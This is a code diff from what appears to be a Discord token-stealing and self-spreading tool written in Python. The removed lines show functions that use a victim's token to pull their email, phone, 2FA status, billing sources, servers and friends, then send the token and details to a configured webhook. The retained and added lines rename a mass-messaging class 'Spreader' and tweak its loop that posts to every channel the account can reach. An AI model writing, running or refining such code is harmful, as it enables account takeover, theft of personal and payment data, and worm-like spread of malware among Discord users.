@@ -1,115 +1,7 @@
-# from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
-from http.client import HTTPException
-from discord import NotFound, Webhook, Embed
-import discord
 import config
 import asyncio
-from colorama import Fore
-from datetime import datetime
-import aiohttp
-import random
-import os
-from enum import Enum
 
-async def get_headers(token, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
-
-async def get_details(token):
-    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me", headers=await get_headers(token)) as resp:
-        data = await resp.json()
-        if not data['phone']:
-            data['phone'] = False
-        return data
-            
-async def get_relationships(token):
-    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/relationships", headers=await get_headers(token)) as resp:
-        data = await resp.json()
-        return len(data)
-
-async def get_guilds(token):
-    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true", headers=await get_headers(token)) as resp:
-        return await resp.json()
-    
-async def get_payment(token):
-    async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await get_headers(token)) as resp:
-        return await resp.json()
-
-async def get_roles(token, guild_id):
-    async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/roles", headers=await get_headers(token)) as resp:
-        return await resp.json()
-
-async def parse_payment(payment):
-    if payment:
-        for pm in payment:
-            if 'invalid' in pm: #if there is invalid a pm exists
-                if pm['invalid'] == False: 
-                    return True
-    return False   
-
-
-async def capture_owned_guilds(guilds):
-    owned_guilds = []
-    for guild in guilds:
-        if guild["owner"]:
-            owned_guilds.append(guild)
-    return owned_guilds
-
-async def generate_embed(user):
-    guilds = await get_guilds(user.token)
-    owned_guilds = await capture_owned_guilds(guilds)
-    
-    embed = Embed()
-
-    embed.set_author(name=f"{user.details['username']}#{user.details['discriminator']}:{user.details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{user.details['id']}/{user.details['avatar']}.webp?size=128")
-    embed.add_field(name='Token',         value=user.token, inline=False)
-    embed.add_field(name='Email',         value=user.email, inline=False)
-    embed.add_field(name='Phone',         value=user.phone, inline=False)
-    embed.add_field(name='2FA',           value=user.details["mfa_enabled"])
-    embed.add_field(name='Nitro',         value=user.nitro)
-    embed.add_field(name='Billing',       value=user.valid_payment)
-    embed.add_field(name='Relationships', value=await get_relationships(user.token))
-    embed.add_field(name='Guilds',        value=len(guilds))
-    embed.add_field(name='Owned Guilds',  value=len(owned_guilds))
-
-    embed.set_footer(text=f"screen: [{config.screensess}] server: [{user.logged_from}]")
-    for guild in owned_guilds:
-        pass
-        # embed.add_embed_field(name=guild['name'], value=f"{guild['approximate_member_count']} Members", inline=False)
-    return embed
-
-
-async def send_webhook(user):
-    async with aiohttp.ClientSession() as session:  
-        
-        webhook = Webhook.from_url(config.config["webhook_url"], session=session)
-        embed = await generate_embed(user)
-        try:
-            await webhook.send(embed=embed)
-        except HTTPException:
-            print(f'{Fore.RED}[Error] HTTPException Failed to send to webhook.')
-        except NotFound:
-            print(f'{Fore.RED}[Error] Notfound Failed to send to webhook.')
-        except TypeError:
-            print(f'{Fore.RED}[Error] TypeError Failed to send to webhook.')
-
-
-
-async def send_friend_request(token, user):
-    payload = {
-        "username": user[0],
-        "discriminator": user[1]
-    }
-    async with aiohttp.request("POST", "https://discord.com/api/v9/users/@me/relationships", json=payload, headers=await get_headers(token)) as resp:
-        pass
-
-
-class MassDM:
+class Spreader:
 
     async def init(self, token, name):
         self.token = token
@@ -135,24 +27,6 @@ class MassDM:
             headers.update({"Authorization": token})
         return headers
 
-    
-    async def get_guilds(self):
-        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
-            return await resp.json()
-
-    async def get_guild_channels(self, guild_id):
-        async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
-            return await resp.json()
-
-
-    async def get_dms(self):
-        async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
-            return await resp.json()
-
-
-    async def get_relationships(self):
-        async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
-            return await resp.json()
         
     async def update_status(self, message):
         payload = {
@@ -289,6 +163,8 @@ class MassDM:
 
                 if channel['type'] == 0:
                     resp = await self.message_channel(channel['id'])
+                    if ((channel['permissions'] & 0x800) == 0x800): #check for send messages permission
+                        continue
                     if resp == "captcha":
                         return
                     if resp == "rate_limit":
